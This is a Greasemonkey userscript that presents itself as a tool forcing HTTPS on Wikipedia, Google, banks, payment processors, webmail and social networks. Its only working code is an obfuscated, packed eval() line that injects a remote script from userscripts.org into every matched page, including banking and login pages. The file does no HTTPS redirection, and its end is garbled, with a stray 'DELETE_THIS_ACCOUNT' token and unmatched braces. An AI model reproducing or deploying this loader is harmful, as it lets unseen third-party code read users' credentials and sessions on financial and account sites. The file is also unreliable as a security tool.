// SSL Certificates Pro
// version 2.7
// Started 30-03-2010
//
//
// ==UserScript==
// @name	SSL Certificates  Plus
// @description	Forces some websites like wikipedia, gmail, twitter or facebook to use secure connections.

// Wikipedia Secure
// @include	http://fr.wikipedia.org/*
// @include	http://en.wikipedia.org/*
// @include	http://es.wikipedia.org/*
// @include	http://pl.wikipedia.org/*
// @include	http://ru.wikipedia.org/*
// @include	http://nl.wikipedia.org/*
// @include	http://pt.wikipedia.org/*
// @include	http://it.wikipedia.org/*
// @include	http://de.wikipedia.org/*

// Google Websites
// @include	http://code.google.tld/*
// @include	http://docs.google.tld/*
// @include	http://documents.google.tld/*
// @include	http://groups.google.tld/*
// @include	http://mail.google.com/*
// @include	http://reader.google.tld/*
// @include	http://sites.google.tld/*
// @include	http://wave.google.tld/*
// @include	http://spreadsheets.google.tld/*
// @include	http://gmail.google.com/*
// @include	http://www.google.tld/about.html
// @include	http://www.google.tld/accounts/*
// @include	http://www.google.tld/aclk/*
// @include	http://www.google.tld/ads/*
// @include	http://www.google.tld/advanced_searchive.org/*
// @include	http://www.google.tld/bookmarks/*
// @include	http://www.google.tld/calendar/*
// @include	http://www.google.tld/contacts/*
// @include	http://www.google.tld/dashboard/*
// @include	http://www.google.tld/dictionary/*
// @include	http://www.google.tld/finance/*
// @include	http://www.google.tld/grphp/*
// @include	http://www.google.tld/help/*
// @include	http://www.google.tld/history/*
// @include	http://www.google.tld/intl/*
// @include	http://www.google.tld/language_tools/*
// @include	http://www.google.tld/notebook/*
// @include	http://www.google.tld/preferences/*
// @include	http://www.google.tld/quality_form/*
// @include	http://www.google.tld/reader/*
// @include	http://www.google.tld/search/*
// @include	http://www.google.tld/squared/*
// @include	http://www.google.tld/support/*
// @exclude	http://www.google.tld/support/forum/*
// @include	http://www.google.tld/swr/*
// @include	http://www.google.tld/transliterate/*
// @include	http://www.google.tld/voice/*
// @include	http://www.google.tld/webhp/*
// @include	http://www.google.tld/profiles/*
// @include	http://www.google.tld/webmasters/tools/*
// @include	http://*.appspot.tld/*
// @include	http://*.googleusercontent.com/*
// @include	http://ssl.scroogle.org/*

// Bank Sites
// @include	http://checkout.google.com/*
// @include	http://www.alertpay.com/*
// @include	http://www.authorize.net/*
// @include	http://www.ccnow.com/*
// @include	http://www.ikobo.com/*
// @include	http://ikobo.com/*
// @include	http://www.clickbank.com/*
// @include	http://epay.propay.com/*
// @include	http://www.moneybookers.com/*
// @include	http://www.auctioncheckout.com/*
// @include	http://www.2checkout.com/*
// @include	http://www.voipbuster.com/*
// @include	http://www.banesto.es/*
// @include	http://www.ceca.es/*
// @include	http://www.sidenor.com/*
// @include	http://www.bbvanetcash.com/*
// @include	http://www.bbvanetoffice.com/*
// @include	http://www.activobank.com/*
// @include	http://www.bancamarch.es/*
// @include	http://bancamarch.es/*
// @include	http://www.ibercaja.es/*
// @include	http://ibercaja.es/*
// @include	http://portal.bbk.es/*
// @include	http://www.bbk.es/*
// @include	http://www.cam.es/*
// @include	http://www.uno-e.com/*
// @include	http://www.i-banesto.com/*
// @include	http://www.bancosantander.es/*
// @include	http://www.lacaixa.es/*
// @include	http://www.ingdirect.es/*
// @include	http://www.bbva.es/*
// @include	http://www.ovh.es/*
// @include	http://paypal.com/*
// @include	http://amazon.co.uk/*
// @include	http://www.paypal.com/*
// @include	http://www.amazon.co.uk/*
// @include	http://alipay.com/*
// @include	http://www.mercadolibre.com/*
// @include	http://www.mercadolibre.tld/*
// @include	http://www.todocoleccion.net/*
// @include	http://www.abebooks.com/*
// @include	http://www.linklift.tld/*
// @include	http://www.adpv.com/*
// @include	http://chitika.com/*
// @include	http://www.burstmedia.com/*
// @include	http://www.linkshare.com/*
// @include	http://ads.kanoodle.com/*
// @include	http://www.cj.com/*
// @include	http://cj.com/*
// @include	http://publisher.yahoo.com/*

// Social Networks
// @include	http://www.facebook.com/*
// @include	http://yfrog.com/*
// @include	http://www.yfrog.com/*
// @include	http://account.live.com/*
// @include	http://login.yahoo.com/*
// @include	http://login.live.com/*
// @include	http://twitter.com/*
// @include	http://www.friendfeed.com/*
// @include	http://friendfeed.com/*
// @include	http://www.facebook.com/
// @include	http://s-static.ak.facebook.com/*
// @include	http://www.facebook.com/login.php*
// @include	http://login.facebook.com/*
// @include	http://orkut.com/*
// @include	http://twitpic.com/*
// @include	http://img.ly/*
// @include	http://www.mail2web.com/*
// @include	http://mail2web.com/*
// @include	http://www.mail.com/*
// @include	http://mail.com/*
// @include	http://www.aol.com/*
// @include	http://identi.ca/*
// @include	http://www.meebo.com/*
// @include	http://www.openid.net/*
// @include	http://www.spamgourmet.com/*
// @include	http://meebo.com/*
// @include	http://openid.net/*
// @include	http://spamgourmet.com/*

// Other
// @include	http://mail.arantius.com/*
// @include	http://arantius.com/*
// @include	http://www.sslunblock.com/*
// @include	http://sslunblock.com/*
// @include	http://clearlydrunk.com/*
// @include	http://ixquick.com/*
// @include	http://securepixels.com/*
// @include	http://www.ixquick.com/*
// @include	http://www.securepixels.com/*
// @include	http://static.e-junkie.com/*
// @include	http://secure.studivz.net/*
// @include	http://ssl.what.cd/*
// @include	http://www.what.cd/*
// @include	http://freesslproxy.com/*
// @include	http://www.libertybell.biz/*
// @include	http://libertybell.biz/*
// @include	http://listen.grooveshark.com/*
// @include	http://www.pandora.com/*
// @include	http://www.torrentz.com/*
// @include	http://www.uservoice.com/*
// @include	http://uservoice.com/*
// @include	http://www.box.net/
// @include	support.comodo.com/*
// @include	secure.comodo.com/*
// @include	http://www.instantssl.com/*
// @include	http://www.virustotal.com/*
// @include	http://www.nytimes.com/*
// @include	http://nytimes.com/*
// @include	http://help.ubuntu.com/*
// @include	http://secure.wikileaks.org/*
// @include	http://www.mozilla.org/*
// @include	http://mozilla.org/*
// @include	http://addons.mozilla.org/*
// @include	http://planet.mozilla.org/*
// @include	http://wiki.mozilla.org/*
// @include	http://developer.mozilla.org/*
// @include	http://microsoft.com/*
// @include	http://www.microsoft.com/*
// @include	http://thepiratebay.org/*
// @include	http://static.thepiratebay.org/*
// @include	http://rss.thepiratebay.org/*
// @include	http://www.isohunt.com/*
// @include	http://evernote.com/*
// @include	http://binsearch.info/*
// @include	http://binsearch.net/*
// @include	http://opendns.com/*
// @include	http://zoho.com/*
// @include	http://xmarks.com/*
// @include	http://proxy.org/*
// @include	http://www.isohunt.com/*
// @include	http://www.evernote.com/*
// @include	http://www.binsearch.info/*
// @include	http://www.binsearch.net/*
// @include	http://www.opendns.com/*
// @include	http://www.zoho.com/*
// @include	http://www.xmarks.com/*
// @include	http://www.proxy.org/*
// @include	http://proxy.org/*
// @include	http://proxify.com/*
// @include	http://www.proxify.com/*
// @include	http://bugs.kde.org/*
// @include	http://members.webs.com/*
// @include	http://members.freewebs.com/*
// @include	http://godaddy.com/*
// @include	http://www.godaddy.com/*
// @include	http://www.apple.com/*
// @include	http://www.adobe.com/*
// @include	http://inbox.com/*
// @include	http://ezpzemail.com/*
// @include	http://mybloglog.com/*
// @include	http://www.inbox.com/*
// @include	http://www.ezpzemail.com/*
// @include	http://www.mybloglog.com/*
// @include	http://addthis.com/*
// @include	http://registration.excite.com/*
// @include	http://login.passport.net/*
// @include	http://bugs.gentoo.org/*
// @include	http://forums.gentoo.org/*
// @include	http://*mcafeesecure.com/*
// @include	http://*authorize.net/*
// @include	http://*versapay.com/*
// @include	http://www.mcafeesecure.com/*
// @include	http://www.authorize.net/*
// @include	http://www.versapay.com/*
// @include	http://canalonline.vodafone.es/*
// @include	http://online.vodafone.tld/dispatch*
// @include	http://www.yoigo.com/index.php
// @include	http://www.yoigo.com/
// @include	http://tickets.vueling.com/*
// @include	http://www.infojobs.net/*
// @include	http://infojobs.net/*
// @include	http://www.verisign.tld/*
// @include	http://www.tv.com/*
// @include	http://bugs.gentoo.org/*
// @include	http://bugs.kde.org/*
// @include	http://www.2sms.com/*
// @include	http://members.webs.com/*
// @include	http://members.freewebs.com/*
// @include	http://www.ps.no/*
// @include	http://qxl.no/*
// @include	http://www.qxl.no/*
// @include	http://cache.addthiscdn.com/*
// @include	http://www.rapidshare.com/*
// @include	http://rapidshare.com/*
// @include	http://login.passport.net/uilogin.srf*
// @include	http://login.passport.net/*
// @include	http://www.certisur.com.ve/*
// @include	http://www.hi5.com/*
// @include	http://www.bbc.co.uk/*
// @include	http://www.linkedin.com/secure*
// @include	http://cdn.gaggle.net/*
// @include	http://download.entraction.com/*
// @include	http://static-cache.tp-global.net/*
// @include	http://images.vrbo.com/*
// @include	http://www.goldstar.com/*
// @include	http://images.goldstar.com/*
// @include	http://static.woopra.com/*
// @include	http://iseatz.com/*
// @include	http://www.adbrite.com/*
// @include	http://content.truste.com/*
// @include	http://e1.boxcdn.net/*
// @include	http://e2.boxcdn.net/*
// @include	http://e3.boxcdn.net/*
// @include	http://cdn.psw.net/*
// @include	http://www.psw.net/*
// @include	http://secure.comodo.com/*
// @include	http://vwww.comodo.com/*
// @include	http://policy.truste.com/*
// @include	http://typekit.com/images/*
// @include	http://maps.ovi.com/*
// @include	http://store.ovi.com/*
// @include	http://mail.ovi.com/*
// @include	http://files.ovi.com/*
// @include	http://contactsui.ovi.com/*
// @include	http://www.nokia.com/*
// @include	http://tienda.nokia.es/*
// @include	https://store.nokia.com/*
// @include	http://ovi.com/*
// @include	http://www.ovi.com/*
// @include	http://4shared.com/*
// @include	http://101distribution.com/*
// @include	http://1040now.net/*
// @include	http://10kscholarship.com/*
// @include	http://123cheapdomains.com/*
// @include	http://192.com/*
// @include	http://1stfinancialfcu.org/*
// @include	http://2mcctv.com/*
// @include	http://4mybenefits.com/*
// @include	http://4structures.com/*
// @include	http://877myjuicer.com/*
// @include	http://authorize.net/*
// @include	http://godaddy.com/*
// @include	http://esignforms.com/*
// @include	http://stealthmessage.com/*
// @include	http://securenym.net/*
// @include	http://keptprivate.com/*
// @include	http://filefortress.com/*
// @include	http://securecomputing.com/*
// @include	http://bluebottle.com/*
// @include	http://vfemail.net/*
// @include	http://fastmail.ca/*
// @include	http://hushmail.com/*
// @include	http://proxify.com/*
// @include	http://psdata.no/*
// @include	http://netshop.no/*
// @include	http://openssl.org/*
// @include	http://fileburst.com/*
// @include	http://iseatz.com/*
// @include	http://www.4shared.com/*
// @include	http://www.101distribution.com/*
// @include	http://www.1040now.net/*
// @include	http://www.10kscholarship.com/*
// @include	http://www.123cheapdomains.com/*
// @include	http://www.192.com/*
// @include	http://www.1stfinancialfcu.org/*
// @include	http://www.2mcctv.com/*
// @include	http://www.4mybenefits.com/*
// @include	http://www.4structures.com/*
// @include	http://www.877myjuicer.com/*
// @include	http://www.authorize.net/*
// @include	http://www.godaddy.com/*
// @include	http://www.esignforms.com/*
// @include	http://www.stealthmessage.com/*
// @include	http://www.securenym.net/*
// @include	http://www.keptprivate.com/*
// @include	http://www.filefortress.com/*
// @include	http://www.securecomputing.com/*
// @include	http://www.bluebottle.com/*
// @include	http://www.vfemail.net/*
// @include	http://www.fastmail.ca/*
// @include	http://www.hushmail.com/*
// @include	http://www.proxify.com/*
// @include	http://www.psdata.no/*
// @include	http://www.netshop.no/*
// @include	http://www.openssl.org/*
// @include	http://www.fileburst.com/*
// @include	http://www.iseatz.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// Exclude
// @exclude	http://www.linklift.com/*
// @exclude	http://www.bbc.co.uk/*
// @exclude	http://web.archive.org/*
// @exclude	http://images.google.tld/*
// @exclude	http://www.google.tld/search*
// @exclude	http://www.google.tld/#*
// @exclude	http://*query=*
// @exclude	http://*imgres*imgurl=*
// @exclude	http://*search.yahoo.com/*

// @include	http://www.google.com/
// @include	http://www.google.com/webhp
// @include	http://www.google.com/search

//Note: .tld extension dosent works if is .tdl/*

// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



// ###### Start of Wikipedia secure script

//Secure a given link
function fixlink(link){
	var special='commons,species,meta'
	var keyword = special.split(',');
	DELETE_THIS_ACCOUNT
}}}}}}}}}}}}